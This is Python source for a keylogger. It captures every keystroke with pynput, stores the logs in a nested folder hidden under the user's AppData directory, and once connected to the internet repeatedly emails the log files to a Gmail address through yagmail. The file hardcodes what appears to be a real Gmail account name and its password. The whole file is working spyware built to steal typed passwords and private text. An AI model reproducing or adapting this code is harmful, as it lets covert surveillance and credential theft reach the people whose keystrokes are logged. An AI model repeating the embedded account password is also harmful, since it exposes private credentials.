from pynput.keyboard import Listener
import yagmail
import threading
import socket
import os
import datetime

if os.path.exists("C:/Users/Daniel Otoo/AppData/Local/Strokes/a/b/c/d/e/f/g") is True:
    pass
else:
    os.makedirs("C:/Users/Daniel Otoo/AppData/Local/Strokes/a/b/c/d/e/f/g")

DateAndTime = datetime.datetime.now().strftime("-%Y-%m-%d-%H-%M-%S")
key_strokes = "C:/Users/Daniel Otoo/AppData/Local/Strokes/" \
              "a/b/c/d/e/f/g/Key_log"+DateAndTime+".txt"

logs = []
count = 0
countInternet = 0


def its_connected():
    try:
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        pass
    return False


def send_mail():
    receiver = "otoodaniel56@gmail.com"
    body = "Key Strokes"
    file_name = key_strokes

    yag = yagmail.SMTP("blackcodetech1@gmail.com", "Easychange0548268517")
    yag.send(
        to=receiver,
        subject="key strokes",
        contents=body,
        attachments=file_name,
    )
    os.removedirs(key_strokes)


def write_to_file(brk, files):
    with open(key_strokes, 'a') as f:
        for file in files:
            f.write(file)

        f.write(brk)


def on_pressed(key):
    global logs, count, countInternet

    key_data = str(key)
    key_data = key_data.replace("'", "")

    if key_data == 'Key.space':
        key_data = ' '
    elif key_data == 'Key.shift' or key_data == 'Key.shift_r':
        key_data = '<Sht>'
    elif key_data == 'Key.ctrl_l' or key_data == 'Key.ctrl_r':
        key_data = '<Ctrl>'
    elif key_data == 'Key.alt_l' or key_data == 'Key.alt_r':
        key_data = '<Alt>'
    elif key_data == 'Key.backspace':
        key_data = "<Bksp>"
    elif key_data == 'Key.enter':
        key_data = "\n"
    elif key_data == 'Key.delete':
        key_data = "<Delete>"
    elif key_data == 'Key.up':
        key_data = "<Up>"
    elif key_data == 'Key.down':
        key_data = "<Down>"
    elif key_data == 'Key.right':
        key_data = "<Right>"
    elif key_data == 'Key.left':
        key_data = "<Left>"
    elif key_data == 'Key.tab':
        key_data = "    "
    elif key_data == 'Key.cmd':
        key_data = "<Windows>"
    elif key_data == 'Key.num_lock':
        key_data = "<Num Lock>"
    elif key_data == 'Key.caps_lock':
        key_data = "<Caps>"
    elif key_data == 'Key.home':
        key_data = "<Home>"
    elif key_data == 'Key.end':
        key_data = "<End>"
    elif key_data == 'Key.page_up':
        key_data = "<Pg_Up>"
    elif key_data == 'Key.page_down':
        key_data = "<Pg_Dn>"
    elif key_data == 'Key.ctrl' + 'a':
        key_data = "<Ctrl + A>"
    elif key_data == 'Key.f1':
        key_data = "<f1>"
    elif key_data == 'Key.f2':
        key_data = "<f2>"
    elif key_data == 'Key.f3':
        key_data = "<f3>"
    elif key_data == 'Key.f4':
        key_data = "<f4>"
    elif key_data == 'Key.f5':
        key_data = "<f5>"
    elif key_data == 'Key.f6':
        key_data = "<f6>"
    elif key_data == 'Key.f7':
        key_data = "<f7>"
    elif key_data == 'Key.f8':
        key_data = "<f8>"
    elif key_data == 'Key.f9':
        key_data = "<f9>"
    elif key_data == 'Key.f10':
        key_data = "<f10>"
    elif key_data == 'Key.f11':
        key_data = "<f11>"
    elif key_data == 'Key.f12':
        key_data = "<f12>"

    logs.append(key_data)
    if len(logs) >= 100:
        brk = "\n"
        write_to_file(brk, logs)
        logs.clear()
        if its_connected():
            count += 1
            if count == 100:
                count = 0
                t1 = threading.Thread(target=send_mail, name="t1")
                t1.start()
        else:
            pass

        logs.clear()


with Listener(on_press=on_pressed) as L:
    L.join()
